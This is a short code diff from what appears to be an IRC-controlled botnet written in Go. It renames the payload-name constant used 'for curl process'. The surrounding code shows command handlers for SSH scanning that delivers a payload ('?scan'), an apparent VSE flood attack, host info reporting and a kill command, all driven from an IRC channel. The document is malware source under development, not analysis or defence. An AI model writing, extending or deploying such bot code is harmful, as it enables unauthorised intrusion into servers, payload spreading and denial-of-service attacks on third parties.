@@ -18,7 +18,7 @@ const (
 	IRC_Server        = "" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
 	IRC_Channel       = "" //config channel here. //should have space!!! //"#Example "
 	IRC_Chan_Password = "" //config channel password here. //If you didn't have, Just leave it blank.
-	Payload_Name      = "" //config payload name.
+	New_Payload_Name  = "" //config payload new name. //For curl process.
 )
 
 //////////////////////////////////////////////////////////////////////////
@@ -84,7 +84,7 @@ func main() {
 				tools.VSE(tools.IRC_Recv(ircRead, 4), tools.IRC_Recv(ircRead, 5), IRC_Channel, irc)
 			} else if tools.IRC_Find(ircRead, "?scan") {
 				tools.IRC_Report(irc, IRC_Channel, "START SCANNING.")
-				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
+				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, New_Payload_Name)
 			} else if tools.IRC_Find(ircRead, "?info") {
 				tools.ReportInf(irc, IRC_Channel)
 			} else if tools.IRC_Find(ircRead, "?kill") {
